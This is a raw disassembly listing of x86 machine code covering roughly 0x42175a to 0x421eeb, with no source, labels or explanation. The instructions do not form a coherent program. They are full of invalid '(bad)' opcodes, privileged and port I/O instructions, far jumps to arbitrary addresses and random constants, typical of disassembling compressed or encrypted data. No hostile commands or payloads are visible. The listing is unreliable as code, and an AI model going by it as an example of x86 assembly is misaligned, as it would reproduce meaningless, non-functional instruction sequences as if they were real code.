  42175a:	or     al,BYTE PTR ds:0x3a9d63e9
  421760:	and    DWORD PTR [edx],ebp
  421762:	cmp    edi,DWORD PTR [edi]
  421764:	dec    ebp
  421765:	mov    ds:0x9a3c64de,eax
  42176a:	shr    BYTE PTR [edi+0x5c],0xd
  42176e:	mov    eax,0x6b15bd50
  421773:	fsubr  st,st(6)
  421775:	push   eax
  421776:	stc    
  421777:	inc    ebp
  421778:	mov    ch,0x6e
  42177a:	add    ecx,DWORD PTR [edx-0x778387b8]
  421780:	test   al,0xc1
  421782:	jl     0x4217a1
  421784:	push   es
  421785:	and    dh,BYTE PTR [eax-0x6]
  421788:	pop    edi
  421789:	(bad)  
  42178a:	in     al,0x3e
  42178c:	mov    ebx,0xf4c8a0d0
  421791:	sti    
  421792:	arpl   WORD PTR [edx-0x40],bp
  421795:	xlat   BYTE PTR ds:[ebx]
  421796:	xchg   esi,eax
  421797:	sbb    ebp,DWORD PTR [esi+eax*1-0x44eed40b]
  42179e:	adc    al,0x72
  4217a0:	lahf   
  4217a1:	cli    
  4217a2:	dec    ecx
  4217a3:	dec    ebp
  4217a4:	(bad)  
  4217a5:	mov    cl,0xae
  4217a7:	in     eax,0x93
  4217a9:	jl     0x4217fb
  4217ab:	dec    ebx
  4217ac:	dec    dx
  4217ae:	rdmsr  
  4217b0:	inc    ebx
  4217b1:	stc    
  4217b2:	dec    eax
  4217b3:	loop   0x4217ee
  4217b5:	scas   eax,DWORD PTR es:[edi]
  4217b6:	rcr    esp,1
  4217b8:	inc    ebx
  4217b9:	mov    eax,ds:0xdeb0062a
  4217be:	jl     0x4217cf
  4217c0:	inc    eax
  4217c1:	xor    DWORD PTR [ebx+esi*1-0x37fe5631],0x777e0d3e
  4217cc:	xor    DWORD PTR [ebx+ebx*4-0x3fb72aae],edi
  4217d3:	retf   
  4217d4:	fimul  DWORD PTR [edi+0x7255559e]
  4217da:	loope  0x421783
  4217dc:	fwait
  4217dd:	sbb    DWORD PTR [ebp+0x42ec41fc],0xa2e515d5
  4217e7:	cmp    BYTE PTR [edi],dl
  4217e9:	fsubrp st(7),st
  4217eb:	mov    bl,0x95
  4217ed:	sub    eax,0x43072333
  4217f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217f3:	jb     0x4217cb
  4217f5:	mov    BYTE PTR [ecx+eiz*8],dh
  4217f8:	dec    edi
  4217f9:	add    bl,BYTE PTR [ebx-0x6b82a7cd]
  4217ff:	push   ebp
  421800:	pop    ds
  421801:	cld    
  421802:	loope  0x42186f
  421804:	dec    ecx
  421805:	inc    eax
  421806:	aad    0xef
  421808:	jle    0x4217cf
  42180a:	stos   DWORD PTR es:[edi],eax
  42180b:	mov    cl,bh
  42180d:	adc    BYTE PTR [ecx+0x14],0x7b
  421811:	and    eax,0x619ea14e
  421816:	imul   edx,DWORD PTR [ebp-0x5bd91363],0x22
  42181d:	out    dx,al
  42181e:	shl    bh,1
  421820:	xor    BYTE PTR [ecx],0xba
  421823:	(bad)  
  421824:	fs cwde 
  421826:	ja     0x42186f
  421828:	fcomp  st(7)
  42182a:	dec    edx
  42182b:	stos   DWORD PTR es:[edi],eax
  42182c:	dec    esp
  42182d:	jmp    0xed5e949b
  421832:	in     al,0xd
  421834:	cmp    BYTE PTR [eax+0x3e],ch
  421837:	mov    ds:0x84740eab,eax
  42183c:	ins    BYTE PTR es:[edi],dx
  42183d:	inc    esp
  42183e:	sti    
  42183f:	adc    BYTE PTR [esi],0x15
  421842:	lods   al,BYTE PTR ds:[esi]
  421843:	test   eax,0x60bbee98
  421848:	aaa    
  421849:	hlt    
  42184a:	cli    
  42184b:	nop
  42184c:	jne    0x421888
  42184e:	enter  0xf998,0x4d
  421852:	dec    ebx
  421853:	fcmovb st,st(0)
  421855:	push   ss
  421856:	xchg   DWORD PTR [edi+0x1114fb00],edi
  42185c:	(bad)  
  42185d:	ficom  WORD PTR [ecx-0x60]
  421860:	les    edi,FWORD PTR [edx+ebx*2-0x1b0d375b]
  421867:	and    ah,BYTE PTR [ebp+0x1cfb5e51]
  42186d:	mov    al,ds:0x78384796
  421872:	clc    
  421873:	ret    0xacf2
  421876:	(bad)  
  421877:	lods   eax,DWORD PTR ds:[esi]
  421878:	fisttp DWORD PTR ds:0xafacd44b
  42187e:	jle    0x4218d6
  421880:	outs   dx,BYTE PTR ds:[esi]
  421881:	mov    cl,0x35
  421883:	and    al,BYTE PTR [ebx+edx*4]
  421886:	cli    
  421887:	pusha  
  421888:	dec    esp
  421889:	les    ebp,FWORD PTR [edx+0x6a929968]
  42188f:	pop    ebp
  421890:	jle    0x421831
  421892:	cmp    al,0x12
  421894:	icebp  
  421895:	(bad)  
  421896:	jge    0x421868
  421898:	dec    edx
  421899:	push   cs
  42189a:	mov    bh,0xcc
  42189c:	(bad)  
  42189d:	jnp    0x421853
  42189f:	sar    cl,1
  4218a1:	or     DWORD PTR [edi-0x5661cbac],ecx
  4218a7:	out    0xad,eax
  4218a9:	in     al,0x7
  4218ab:	rcl    BYTE PTR [eax+0x74],1
  4218ae:	add    ch,BYTE PTR [edx+eiz*8-0x77fabc3]
  4218b5:	fcmovb st,st(0)
  4218b7:	lods   al,BYTE PTR ds:[esi]
  4218b8:	dec    esi
  4218b9:	mov    eax,0xc2027e24
  4218be:	xchg   ecx,eax
  4218bf:	xchg   edx,eax
  4218c0:	loopne 0x42185e
  4218c2:	cmp    bl,BYTE PTR [esi]
  4218c4:	jb     0x421855
  4218c6:	mov    bl,0xf7
  4218c8:	pop    edx
  4218c9:	xchg   ecx,eax
  4218ca:	nop
  4218cb:	adc    al,0x27
  4218cd:	cs test ecx,0x31b4c915
  4218d4:	jl     0x4218e2
  4218d6:	mov    ecx,0x5c00cd9f
  4218db:	mov    esi,0xf1e7c686
  4218e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218e1:	ja     0x42186b
  4218e3:	daa    
  4218e4:	aas    
  4218e5:	(bad)  
  4218e7:	mov    BYTE PTR [ecx],0x14
  4218ea:	push   esi
  4218eb:	das    
  4218ec:	add    bl,BYTE PTR [esi]
  4218ee:	sub    edi,DWORD PTR ds:0xb439a9ed
  4218f4:	push   ds
  4218f5:	fisttp WORD PTR [edx]
  4218f7:	fmulp  st(7),st
  4218f9:	add    BYTE PTR [eax],al
  4218fb:	add    dl,dh
  4218fd:	rol    BYTE PTR ds:0xf6d53751,0xe3
  421904:	out    dx,al
  421905:	sub    ebp,esp
  421907:	bswap  ebp
  421909:	iret   
  42190a:	and    edi,DWORD PTR [edi+0x5c]
  42190d:	xchg   esp,eax
  42190e:	add    DWORD PTR [eax],eax
  421910:	test   DWORD PTR [edx],eax
  421912:	add    BYTE PTR [eax],al
  421914:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421915:	or     al,0x25
  421917:	pop    eax
  421918:	jmp    0x421931
  42191a:	push   edi
  42191b:	test   DWORD PTR [eax],eax
  42191d:	loop   0x42197a
  42191f:	adc    bl,bh
  421921:	mov    ds:0x18122ce2,eax
  421926:	rol    DWORD PTR [ebx],1
  421928:	aam    0x1
  42192a:	inc    ebp
  42192b:	cmp    DWORD PTR [ebp-0x43],0x4a5995a0
  421932:	jecxz  0x42190f
  421934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421935:	test   dl,0x37
  421938:	jne    0x4219b9
  42193a:	push   ecx
  42193b:	mov    fs,WORD PTR [ebp+0x36]
  42193e:	ds or  bh,al
  421941:	sub    BYTE PTR [ecx-0x6bd9195f],dh
  421947:	shr    DWORD PTR [edi],0xe9
  42194a:	out    0x85,eax
  42194c:	outs   dx,DWORD PTR ds:[esi]
  42194d:	stos   BYTE PTR es:[edi],al
  42194e:	mov    cl,0xe7
  421950:	adc    al,BYTE PTR cs:[ecx+0x79]
  421954:	in     al,dx
  421955:	les    ebx,FWORD PTR [esi]
  421957:	ror    DWORD PTR [edi],1
  421959:	mov    eax,ds:0x1d56f7a1
  42195e:	jmp    0xe52b:0xe82c5919
  421965:	xor    eax,0x4de9bd47
  42196a:	and    DWORD PTR [edi+0x2c],eax
  42196d:	mov    dh,BYTE PTR [ecx]
  42196f:	test   DWORD PTR [eax],ebx
  421971:	sbb    al,0x99
  421973:	mov    al,ds:0xbf075e0c
  421978:	pop    edx
  421979:	mov    esi,0x67ebdc91
  42197e:	pop    ebx
  42197f:	shl    BYTE PTR [edx+0x25],0xec
  421983:	jbe    0x4219f1
  421985:	fdivr  DWORD PTR [ebx+ebp*1+0x2f]
  421989:	push   ebp
  42198a:	lods   eax,DWORD PTR ds:[esi]
  42198b:	mov    dh,0xa5
  42198d:	sbb    esp,DWORD PTR [edi+0xcf34082]
  421993:	jecxz  0x421980
  421995:	shr    DWORD PTR [edx],1
  421997:	and    ah,BYTE PTR [eax+ebp*1-0x2c0d88f5]
  42199e:	and    BYTE PTR [eax+0x285f1f41],cl
  4219a4:	fmul   DWORD PTR [edi+0x2a18587b]
  4219aa:	xacquire xchg DWORD PTR [ecx+0x79],eax
  4219ae:	lods   al,BYTE PTR ds:[esi]
  4219af:	dec    edi
  4219b0:	mov    cl,dl
  4219b2:	pop    ss
  4219b3:	add    bl,BYTE PTR [ebx-0x3304a26c]
  4219b9:	in     al,dx
  4219ba:	ret    
  4219bb:	(bad)
  4219be:	push   0x54
  4219c0:	gs mov esi,0xf879c038
  4219c6:	inc    ebx
  4219c7:	fcomp  QWORD PTR [ecx+0xf]
  4219ca:	adc    edx,DWORD PTR ds:0x4d915209
  4219d0:	idiv   DWORD PTR [edx+0x15]
  4219d3:	sub    al,0x46
  4219d5:	mov    dh,al
  4219d7:	mov    ebx,0x6cc07082
  4219dc:	jno    0x4219b8
  4219de:	pop    ds
  4219df:	cli    
  4219e0:	(bad)  
  4219e1:	aaa    
  4219e2:	sti    
  4219e3:	enter  0x9ffd,0x37
  4219e7:	ja     0x4219fe
  4219e9:	data16 jo 0x4219b0
  4219ec:	xchg   edx,eax
  4219ed:	icebp  
  4219ee:	mov    bl,0x42
  4219f0:	mov    fs,WORD PTR [ebx-0x67]
  4219f3:	xchg   edi,eax
  4219f4:	cli    
  4219f5:	retf   0x329
  4219f8:	push   esi
  4219f9:	xor    BYTE PTR [edx+0x41],ch
  4219fc:	int3   
  4219fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4219fe:	jecxz  0x421a20
  421a00:	out    0x3c,al
  421a02:	pop    eax
  421a03:	add    BYTE PTR [ebp+0x42552b5b],al
  421a09:	scas   al,BYTE PTR es:[edi]
  421a0a:	sub    BYTE PTR [ecx],ah
  421a0c:	inc    ecx
  421a0d:	sub    dh,BYTE PTR [eax]
  421a0f:	ss push es
  421a11:	in     eax,dx
  421a12:	mov    ds:0xa1c7f1,eax
  421a17:	test   dh,bl
  421a19:	xchg   edi,eax
  421a1a:	jnp    0x4219eb
  421a1c:	inc    esp
  421a1d:	mov    ebp,0xd2454fb0
  421a22:	mov    edx,0x411a9b72
  421a27:	mov    edx,0x38d7a5ad
  421a2c:	cmp    eax,DWORD PTR [ecx+0x38]
  421a2f:	jo     0x421a99
  421a31:	mov    edi,0x68368fdb
  421a36:	adc    DWORD PTR [eiz*8-0x25350fa7],edx
  421a3d:	mov    WORD PTR [esi],es
  421a3f:	cmp    DWORD PTR ds:0xa87d994b,ebx
  421a45:	mov    dh,0x88
  421a47:	or     eax,0x5ba6a45e
  421a4c:	push   0xffffffe9
  421a4e:	cmp    eax,0x7c650f19
  421a53:	push   cs
  421a54:	xchg   ebp,eax
  421a55:	rol    DWORD PTR [edi-0x4],0x56
  421a59:	pop    ss
  421a5a:	pushf  
  421a5b:	mov    edi,0xae67a87e
  421a60:	loop   0x421a71
  421a62:	adc    al,0x84
  421a64:	int    0x1
  421a66:	mov    edx,0x8de11051
  421a6b:	pop    esi
  421a6c:	mov    ch,0xbc
  421a6e:	aam    0x11
  421a70:	ins    DWORD PTR es:[edi],dx
  421a71:	cmp    al,0xe3
  421a73:	jp     0x421ad7
  421a75:	out    0x12,al
  421a77:	xchg   ebp,eax
  421a78:	mov    cl,0x32
  421a7a:	fiadd  WORD PTR [ecx]
  421a7c:	cmp    edi,ebp
  421a7e:	in     eax,dx
  421a7f:	xlat   BYTE PTR ds:[ebx]
  421a80:	jecxz  0x421a7a
  421a82:	sub    BYTE PTR [edi-0x86d490a],bh
  421a88:	dec    ecx
  421a89:	(bad)  
  421a8a:	loope  0x421ae1
  421a8c:	scas   al,BYTE PTR es:[edi]
  421a8d:	pusha  
  421a8e:	rol    DWORD PTR [esi],1
  421a90:	adc    al,0xee
  421a92:	inc    dh
  421a94:	xor    ebp,eax
  421a96:	arpl   WORD PTR [eax+ebp*1],bp
  421a99:	mov    ds:0xcd27a35a,al
  421a9e:	pop    eax
  421a9f:	xchg   DWORD PTR [eax+0x7203e59c],ebx
  421aa5:	jmp    DWORD PTR [ebx-0x374c82fe]
  421aab:	call   0x5d714382
  421ab0:	push   0x305f9c27
  421ab5:	sti    
  421ab6:	imul   BYTE PTR [edi-0x7daf4ded]
  421abc:	xor    DWORD PTR [eax+0x561bc57f],edx
  421ac2:	cmp    eax,0xe6a252a8
  421ac7:	jns    0x421aa2
  421ac9:	jmp    ebp
  421acb:	jge    0x421b47
  421acd:	xlat   BYTE PTR ds:[ebx]
  421ace:	dec    ecx
  421acf:	pusha  
  421ad0:	sub    BYTE PTR [ebx-0x34c94f3e],bl
  421ad6:	lods   al,BYTE PTR ds:[esi]
  421ad7:	jmp    0x6b73:0xb1103b2e
  421ade:	fisubr DWORD PTR [eax+0x35cd4753]
  421ae4:	adc    bh,ch
  421ae6:	getsec 
  421ae8:	mov    DWORD PTR [eax],ebx
  421aea:	icebp  
  421aeb:	push   0x64ed713a
  421af0:	and    al,0x7a
  421af2:	mov    eax,0xed31e9a7
  421af7:	xor    DWORD PTR [eax+0x6],edi
  421afa:	ja     0x421b2d
  421afc:	shl    BYTE PTR [esi+0x14b945ae],cl
  421b02:	add    al,0x14
  421b04:	push   0xffffff9a
  421b06:	mov    WORD PTR [esi+ebx*4-0x34],es
  421b0a:	lock sub al,0x37
  421b0d:	inc    ebx
  421b0e:	and    al,0x7
  421b10:	fsubrp st(0),st
  421b12:	clc    
  421b13:	mov    al,ds:0xd44402c3
  421b18:	sub    eax,0x99485e7e
  421b1d:	inc    edi
  421b1e:	sbb    al,0xcd
  421b20:	sub    cl,BYTE PTR es:[ebx+0x49]
  421b24:	jbe    0x421b4a
  421b26:	imul   DWORD PTR [ebx]
  421b28:	iret   
  421b29:	out    dx,eax
  421b2a:	xchg   ebp,eax
  421b2b:	dec    edx
  421b2c:	add    eax,0xf4ee7f79
  421b31:	sar    eax,1
  421b33:	add    BYTE PTR [ebp+0x21dd01f6],bl
  421b39:	add    eax,0x43aed119
  421b3e:	data16 pop bp
  421b41:	aaa    
  421b42:	mov    dl,0xd4
  421b44:	leave  
  421b45:	xchg   edi,eax
  421b46:	dec    ebx
  421b47:	or     BYTE PTR [esi+0x17],al
  421b4a:	int3   
  421b4b:	(bad)  
  421b4c:	cmp    eax,0xc1cedbdf
  421b51:	push   ecx
  421b52:	mov    ah,0xac
  421b54:	popa   
  421b55:	mov    BYTE PTR [edx-0xc],ah
  421b58:	mov    cl,0x62
  421b5a:	xchg   esi,eax
  421b5b:	imul   edi,DWORD PTR [eax-0x264824b8],0xfffffff8
  421b62:	inc    edx
  421b63:	stos   DWORD PTR es:[edi],eax
  421b64:	gs push cs
  421b66:	loopne 0x421b7b
  421b68:	loopne 0x421b62
  421b6a:	repnz rol DWORD PTR [edi+0x349820e],0xef
  421b72:	lods   eax,DWORD PTR ds:[esi]
  421b73:	or     al,0x84
  421b75:	cmp    ebp,DWORD PTR [eax]
  421b77:	inc    eax
  421b78:	push   0xd09c724a
  421b7d:	sub    edx,DWORD PTR [ecx+0x483494fe]
  421b83:	lods   al,BYTE PTR ds:[esi]
  421b84:	inc    eax
  421b85:	sub    eax,0xedfb5cac
  421b8a:	dec    ecx
  421b8b:	add    ah,BYTE PTR [esi-0x30]
  421b8e:	pushf  
  421b8f:	cmc    
  421b90:	mov    eax,ds:0xb1156781
  421b95:	push   edi
  421b96:	lods   al,BYTE PTR ds:[esi]
  421b97:	(bad)  
  421b98:	rol    DWORD PTR [eax],1
  421b9a:	add    BYTE PTR [eax],al
  421b9c:	inc    ebx
  421b9d:	inc    ecx
  421b9e:	popa   
  421b9f:	data16 arpl WORD PTR [esi+0x47],sp
  421ba3:	rcr    DWORD PTR gs:[edi+0x16],cl
  421ba7:	xor    BYTE PTR [edx],ch
  421ba9:	cli    
  421baa:	jge    0x421bf3
  421bac:	loope  0x421b44
  421bae:	add    DWORD PTR [eax],eax
  421bb0:	test   DWORD PTR [edx],eax
  421bb2:	add    BYTE PTR [eax],al
  421bb4:	push   cs
  421bb5:	popa   
  421bb6:	add    esi,ecx
  421bb8:	push   es
  421bb9:	adc    DWORD PTR ds:[ecx-0xf732249],ebp
  421bc0:	lahf   
  421bc1:	sbb    DWORD PTR [edx+ebx*8+0x4a],ebp
  421bc5:	add    al,0xfa
  421bc8:	mov    esp,0x9b937519
  421bcd:	aaa    
  421bce:	fwait
  421bcf:	dec    edi
  421bd0:	sbb    edi,DWORD PTR [ebp-0x15]
  421bd3:	mov    DWORD PTR [ebx+0x35],edx
  421bd6:	icebp  
  421bd7:	jg     0x421b80
  421bd9:	mov    ah,0xe2
  421bdb:	sbb    BYTE PTR [ecx-0x34],al
  421bde:	xor    esp,DWORD PTR [esi+0x2d]
  421be1:	jmp    0x421c29
  421be3:	jnp    0x421b74
  421be5:	pcmpgtw mm0,QWORD PTR [eax+0x511aba63]
  421bec:	jbe    0x421b73
  421bee:	loope  0x421b74
  421bf0:	sbb    al,0x6b
  421bf2:	mov    al,BYTE PTR [ebx-0x1e1de479]
  421bf8:	pop    es
  421bf9:	mov    edi,0xba5b6984
  421bfe:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421c00:	fnstenv [ecx]
  421c02:	sub    ebp,eax
  421c04:	jo     0x421c29
  421c06:	stos   DWORD PTR es:[edi],eax
  421c07:	mov    ds:0xd2b7efad,al
  421c0c:	mov    edx,0x6e63e1de
  421c11:	push   0x3c
  421c13:	jge    0x421c1c
  421c15:	sub    edx,DWORD PTR [esp+esi*1]
  421c18:	or     cl,BYTE PTR [esi-0x47a5dc3b]
  421c1e:	xchg   ebx,eax
  421c1f:	cdq    
  421c20:	xchg   BYTE PTR [ecx-0x36],dl
  421c23:	gs test al,0x58
  421c26:	lods   eax,DWORD PTR ds:[esi]
  421c27:	nop
  421c28:	or     al,0x6d
  421c2a:	aad    0x55
  421c2c:	data16 hlt 
  421c2e:	mov    cl,0xe5
  421c30:	adc    DWORD PTR [edx-0x10],edi
  421c33:	mov    al,ds:0xe948725c
  421c38:	pop    ss
  421c39:	mov    ds:0xf32858ba,eax
  421c3e:	mov    eax,0x77f1a70
  421c43:	sub    cl,BYTE PTR [eax]
  421c45:	jb     0x421c57
  421c47:	fidiv  WORD PTR [esi]
  421c49:	xchg   ebp,eax
  421c4a:	adc    al,0x35
  421c4c:	in     eax,dx
  421c4d:	out    0x2b,al
  421c4f:	cwde   
  421c50:	stos   BYTE PTR es:[edi],al
  421c51:	adc    BYTE PTR [edi-0x49],cl
  421c54:	ror    BYTE PTR [edi-0x80],cl
  421c57:	mov    cl,0x26
  421c59:	cmp    eax,0xb1d6b096
  421c5e:	and    ah,BYTE PTR [edi+0x77]
  421c61:	popa   
  421c62:	jno    0x421cdd
  421c64:	in     al,dx
  421c65:	shl    DWORD PTR [esi],0x6f
  421c68:	retf   0x5805
  421c6b:	scas   al,BYTE PTR es:[edi]
  421c6c:	(bad)  
  421c6d:	retf   
  421c6e:	add    eax,0xbfc66480
  421c73:	xor    eax,0xcaf2d58
  421c78:	aaa    
  421c79:	jo     0x421c1d
  421c7b:	adc    DWORD PTR ds:0xd3c38bc4,esi
  421c82:	leave  
  421c83:	xchg   edx,eax
  421c84:	push   cs
  421c85:	and    al,0xee
  421c87:	jmp    0xc048:0x8cc9482c
  421c8e:	mov    WORD PTR [edx+0x64be6f3],ss
  421c94:	dec    esp
  421c95:	jne    0x421c32
  421c97:	ins    DWORD PTR es:[edi],dx
  421c98:	hlt    
  421c99:	es loop 0x421ca3
  421c9c:	sub    ebx,DWORD PTR [ebp-0x600b6259]
  421ca2:	or     edx,ecx
  421ca4:	in     eax,0xfb
  421ca6:	xor    edx,DWORD PTR [ebx-0x5b]
  421ca9:	push   es
  421caa:	(bad)  
  421cab:	aad    0xf8
  421cad:	mov    ch,0xf6
  421caf:	xor    al,0xda
  421cb1:	(bad)  
  421cb2:	fadd   QWORD PTR ss:[edi+esi*8-0x4b37593b]
  421cba:	push   eax
  421cbb:	lods   al,BYTE PTR ds:[esi]
  421cbc:	mov    bl,0x74
  421cbe:	ret    
  421cbf:	push   ds
  421cc0:	dec    ebp
  421cc1:	or     al,BYTE PTR [ebx+0x10]
  421cc4:	push   esi
  421cc5:	ret    0x5c65
  421cc8:	push   esp
  421cc9:	dec    ebp
  421cca:	xor    bh,al
  421ccc:	test   al,0xa9
  421cce:	jle    0x421c77
  421cd0:	or     ebp,ecx
  421cd2:	mov    edi,0xeaa23569
  421cd7:	cmp    al,0x24
  421cd9:	and    eax,0xfb7b89ee
  421cde:	shr    DWORD PTR [esi],1
  421ce0:	or     edx,edx
  421ce2:	inc    ecx
  421ce3:	mov    bh,0x3a
  421ce5:	rol    BYTE PTR [ecx],cl
  421ce7:	mov    bh,0x72
  421ce9:	push   ds
  421cea:	jmp    0x421ccf
  421cec:	inc    eax
  421ced:	retf   0xa071
  421cf0:	pop    esp
  421cf1:	iret   
  421cf2:	retf   0x3281
  421cf5:	add    ecx,DWORD PTR [eax+esi*1]
  421cf8:	scas   eax,DWORD PTR es:[edi]
  421cf9:	shr    BYTE PTR [edx+ecx*1-0x7cc24034],cl
  421d00:	fwait
  421d01:	lea    edi,[edi+edx*4+0x5c45e24d]
  421d08:	pop    ecx
  421d09:	fwait
  421d0a:	xchg   esi,eax
  421d0b:	iret   
  421d0c:	je     0x421c92
  421d0e:	test   ebx,edi
  421d10:	(bad)
  421d13:	dec    ebp
  421d14:	out    0xa6,al
  421d16:	(bad)  
  421d17:	pop    esp
  421d18:	inc    eax
  421d19:	pop    ds
  421d1a:	idiv   DWORD PTR [eax]
  421d1c:	into   
  421d1d:	mov    al,ds:0x600457bd
  421d22:	sub    al,0xd4
  421d24:	inc    ebx
  421d25:	and    bh,bl
  421d27:	in     eax,0x15
  421d29:	lsl    edi,WORD PTR [edx]
  421d2c:	mov    cl,0xef
  421d2e:	or     esi,esp
  421d30:	mov    bl,0x6e
  421d32:	mov    cl,0xd2
  421d34:	call   0xd0d3:0xbd18e4dc
  421d3b:	sub    al,0x3a
  421d3d:	xor    ah,BYTE PTR [eax+0x4fb7bcc1]
  421d43:	ins    DWORD PTR es:[edi],dx
  421d44:	pushf  
  421d45:	dec    eax
  421d46:	adc    eax,0x9465506
  421d4b:	push   edx
  421d4c:	xchg   edi,eax
  421d4d:	and    dl,BYTE PTR [eax+0x3e]
  421d50:	inc    edx
  421d51:	xchg   ebp,eax
  421d52:	xchg   esi,eax
  421d53:	daa    
  421d54:	lods   al,BYTE PTR ds:[esi]
  421d55:	rcl    DWORD PTR [eax+0x22],0x1d
  421d59:	lahf   
  421d5a:	jnp    0x421db9
  421d5c:	shl    DWORD PTR [ebp+0x52],cl
  421d5f:	sbb    dh,BYTE PTR [ebp+0x4c]
  421d62:	dec    esi
  421d63:	ja     0x421d60
  421d65:	mov    ebp,0xcb00c2a3
  421d6a:	iret   
  421d6b:	jnp    0x421db7
  421d6d:	xor    dh,BYTE PTR [edi]
  421d6f:	sahf   
  421d70:	jnp    0x421cfe
  421d72:	mov    ecx,DWORD PTR [eax-0x43e6d8c2]
  421d78:	pusha  
  421d79:	cmp    BYTE PTR [edi+edx*8+0xd],cl
  421d7d:	std    
  421d7e:	or     DWORD PTR [ecx],ecx
  421d80:	xor    DWORD PTR [ecx+0x44fe6245],0x4e
  421d87:	mov    BYTE PTR [edi+esi*1+0x73],0x9a
  421d8c:	push   esi
  421d8d:	xor    al,0xd8
  421d8f:	jge    0x421d7a
  421d91:	push   edx
  421d92:	(bad)  
  421d93:	jmp    0x543ce663
  421d98:	mov    edi,0x3b2dc0e8
  421d9d:	mov    WORD PTR [ebx],cs
  421d9f:	loopne 0x421d5b
  421da1:	xlat   BYTE PTR ds:[ebx]
  421da2:	pop    esi
  421da3:	bound  esi,QWORD PTR [ebx+eiz*2+0xcef7d94]
  421daa:	jb     0x421de3
  421dac:	in     eax,0x2
  421dae:	es ins DWORD PTR es:[edi],dx
  421db0:	ror    DWORD PTR [eax-0x1de26873],1
  421db6:	mov    ecx,fs
  421db8:	pop    ss
  421db9:	lods   eax,DWORD PTR ds:[esi]
  421dba:	(bad)  
  421dbb:	cld    
  421dbc:	mov    eax,cs:0xdbf113c8
  421dc2:	retf   
  421dc3:	adc    DWORD PTR [ecx+0x5d933c12],0xf
  421dca:	leave  
  421dcb:	fst    QWORD PTR [edx-0xca13c3f]
  421dd1:	mov    edx,DWORD PTR [ebx+0x2dcc67b7]
  421dd7:	test   eax,0xb73a1586
  421ddc:	ins    BYTE PTR es:[edi],dx
  421ddd:	push   ss
  421dde:	and    BYTE PTR [ecx+0x3c],dl
  421de1:	add    eax,0xf42ae98c
  421de6:	in     eax,0x3
  421de8:	test   BYTE PTR [eax-0x5b],ah
  421deb:	adc    BYTE PTR [ecx-0x10],bl
  421dee:	pusha  
  421def:	popf   
  421df0:	daa    
  421df1:	or     dl,cl
  421df3:	mov    ecx,esi
  421df5:	gs je  0x421de0
  421df8:	sbb    al,0x44
  421dfa:	sub    al,BYTE PTR [esi-0x41fa4b9b]
  421e00:	push   ds
  421e01:	push   ecx
  421e02:	mov    eax,ds:0x5f7e898f
  421e07:	mov    ebx,0x699fc45a
  421e0c:	das    
  421e0d:	jle    0x421db4
  421e0f:	jge    0x421e5c
  421e11:	xor    eax,0xd83a95cd
  421e16:	and    DWORD PTR [esi+0x3daafb3d],ecx
  421e1c:	cld    
  421e1d:	sub    ebp,DWORD PTR [esi]
  421e1f:	dec    ebx
  421e20:	stos   DWORD PTR es:[edi],eax
  421e21:	pop    ebx
  421e22:	push   es
  421e23:	push   ecx
  421e24:	cmp    BYTE PTR [ebp+eax*8+0x74],0xc
  421e29:	jg     0x421ded
  421e2b:	shl    BYTE PTR [ecx-0x267959bf],0x76
  421e32:	and    DWORD PTR [ebx+esi*4],esp
  421e35:	mov    ebp,0xff9965
  421e3a:	add    BYTE PTR [eax],al
  421e3c:	mov    ebp,edx
  421e3e:	rcr    DWORD PTR [ebx],cl
  421e40:	repz cmp ecx,ebx
  421e43:	cli    
  421e44:	in     al,dx
  421e45:	jg     0x421e7e
  421e47:	loopne 0x421e02
  421e49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421e4a:	aas    
  421e4b:	ins    BYTE PTR es:[edi],dx
  421e4c:	cwd    
  421e4e:	add    DWORD PTR [eax],eax
  421e50:	test   DWORD PTR [edx],eax
  421e52:	add    BYTE PTR [eax],al
  421e54:	ja     0x421e75
  421e56:	ja     0x421de7
  421e58:	or     bl,ah
  421e5a:	lea    edx,[esi+0x30d9fd98]
  421e60:	jnp    0x421e40
  421e62:	inc    ebx
  421e63:	sub    dh,BYTE PTR [edi+0x706afc2]
  421e69:	cmp    al,0x5a
  421e6b:	enter  0x6573,0xc3
  421e6f:	sub    eax,DWORD PTR [eax]
  421e71:	or     eax,0x4ac3da8d
  421e76:	cs adc al,0x24
  421e79:	inc    ebp
  421e7a:	retf   
  421e7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e7c:	mov    bl,al
  421e7e:	pop    edx
  421e7f:	pop    ss
  421e80:	jmp    0x92e8:0x517e964b
  421e87:	ins    BYTE PTR es:[edi],dx
  421e88:	add    eax,0x2a3900f8
  421e8d:	cmp    ecx,DWORD PTR [ebx-0x2e]
  421e90:	stos   BYTE PTR es:[edi],al
  421e91:	loope  0x421e1a
  421e93:	lods   al,BYTE PTR ds:[esi]
  421e94:	stos   BYTE PTR es:[edi],al
  421e95:	add    eax,0xacaa8373
  421e9a:	xor    BYTE PTR [edi+0x61],al
  421e9d:	inc    ecx
  421e9e:	rol    DWORD PTR cs:[esi-0x7949f62e],1
  421ea5:	mov    ds:0xf1a88149,al
  421eaa:	or     DWORD PTR [eax-0x6e],eax
  421ead:	cmp    edi,DWORD PTR [ecx]
  421eaf:	js     0x421ef9
  421eb1:	je     0x421f1a
  421eb3:	loopne 0x421ec8
  421eb5:	add    esp,DWORD PTR [eax+0x5a]
  421eb8:	lods   eax,DWORD PTR ds:[esi]
  421eb9:	leave  
  421eba:	pop    ebx
  421ebb:	dec    edx
  421ebc:	mov    WORD PTR [eax+0x45d2deb4],ds
  421ec2:	and    ecx,edi
  421ec4:	fisubr WORD PTR [edi-0x61]
  421ec7:	push   cs
  421ec8:	jnp    0x421eb5
  421eca:	xor    ch,BYTE PTR [eax+0x5b]
  421ecd:	adc    eax,0xb1111ff4
  421ed2:	das    
  421ed3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421ed4:	sbb    edx,ebx
  421ed6:	push   ebp
  421ed7:	push   esi
  421ed8:	add    al,0x90
  421eda:	fisttp WORD PTR [edx]
  421edc:	xchg   ebx,eax
  421edd:	jge    0x421f4d
  421edf:	xchg   edx,eax
  421ee0:	pop    eax
  421ee1:	ffreep st(1)
  421ee3:	bound  esi,QWORD PTR [edx+0x139f7fc8]
  421ee9:	xchg   edx,eax
  421eea:	lahf   
  421eeb:	inc    ebp
